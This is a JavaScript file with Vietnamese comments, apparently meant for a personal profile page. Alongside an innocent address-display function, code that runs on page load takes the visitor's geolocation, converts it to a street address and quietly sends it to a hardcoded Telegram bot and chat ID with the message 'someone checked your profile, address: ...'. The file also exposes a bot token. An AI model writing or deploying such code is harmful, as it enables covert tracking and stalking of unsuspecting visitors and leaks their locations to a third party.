// Hàm lấy địa chỉ
function layDiaChi() {
    // Kiểm tra xem trình duyệt có hỗ trợ API Geolocation không
    if (navigator.geolocation) {
        // Lấy vị trí hiện tại của người dùng
        navigator.geolocation.getCurrentPosition(position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Sử dụng Google Maps API để lấy địa chỉ
            const api_key = 'YOUR_API_KEY';
            const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lon}&key=${api_key}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    const address = data.results[0].formatted_address;
                    // Hiển thị địa chỉ
                    document.getElementById('dia-chi').innerHTML = `Địa chỉ của bạn: ${address}`;
                });
        });
    } else {
        // Trình duyệt không hỗ trợ API Geolocation
        document.getElementById('dia-chi').innerHTML = 'Trình duyệt của bạn không hỗ trợ API Geolocation';
    }
}
function getAddress() {
    // Kiểm tra xem trình duyệt có hỗ trợ Geolocation không
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(function (position) {
            // Lấy thông tin vị trí
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            console.log("Latitude: " + latitude + ", Longitude: " + longitude);
            CallBot(latitude, longitude);
        }, function (error) {
            // Xử lý lỗi nếu không thể lấy được vị trí
            console.error("Error getting location:", error);
        });
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}

function CallBot(lat, lon) {
    const token = '7519160416:AAH9bBxuNfVyPHsf09WIDymj5xMDWkexrSQ';
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
    fetch(url)
        .then(response => response.json())
        .then(data => {
            const address = data.display_name;
            const chatId = 6316116913;
            const message = `Có người check profile bạn địa chỉ: ${address}`
            const apiChat = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
            fetch(apiChat)
                .then(response => response.json())
                .then(data => {
                    console.log(data);
                });
        });
}
// Gọi hàm lấy địa chỉ khi trang web được tải
window.onload = getAddress;